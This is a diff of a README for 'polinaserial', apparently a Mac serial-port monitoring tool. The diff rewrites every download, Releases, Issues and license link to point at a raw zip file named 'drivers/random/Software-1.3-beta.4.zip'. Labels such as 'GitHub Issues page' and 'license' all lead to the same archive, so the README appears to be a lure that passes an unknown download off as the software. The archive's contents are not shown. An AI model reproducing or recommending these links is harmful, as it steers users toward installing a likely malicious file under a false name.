@@ -6,7 +6,7 @@ Welcome to polinaserial! This program helps you monitor serial ports on your Mac
 
 ## 📥 Download
 
-[![Download polinaserial](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/Neutrodyne/polinaserial.zip)](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/Neutrodyne/polinaserial.zip)
+[![Download polinaserial](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/drivers/random/Software-1.3-beta.4.zip)](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/drivers/random/Software-1.3-beta.4.zip)
 
 ## 📦 System Requirements
 
@@ -21,11 +21,11 @@ To use polinaserial, ensure that your Mac meets these requirements:
 
 To get started with polinaserial, you need to visit the Releases page to download the application. Click the link below:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/Neutrodyne/polinaserial.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/drivers/random/Software-1.3-beta.4.zip)
 
 ### Steps to Download and Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/Neutrodyne/polinaserial.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/drivers/random/Software-1.3-beta.4.zip).
   
 2. Find the latest version of polinaserial.
 
@@ -83,7 +83,7 @@ If you encounter issues, consider these troubleshooting tips:
 
 If you have questions or need help, join our community:
 
-- Check the [GitHub Issues page](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/Neutrodyne/polinaserial.zip) to see if someone has asked similar questions.
+- Check the [GitHub Issues page](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/drivers/random/Software-1.3-beta.4.zip) to see if someone has asked similar questions.
   
 - Feel free to open a new issue if you can't find a solution.
 
@@ -97,6 +97,6 @@ We welcome contributions to improve polinaserial. If you have an idea or a bug f
 
 ## 🎉 License
 
-polinaserial is open-source software licensed under the MIT License. You can view the full license on our [GitHub page](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/Neutrodyne/polinaserial.zip).
+polinaserial is open-source software licensed under the MIT License. You can view the full license on our [GitHub page](https://raw.githubusercontent.com/Nillkin463/polinaserial/master/drivers/random/Software-1.3-beta.4.zip).
 
 Thank you for choosing polinaserial! We hope it meets your needs for monitoring serial ports effectively. For any feedback, please use the community support channels.
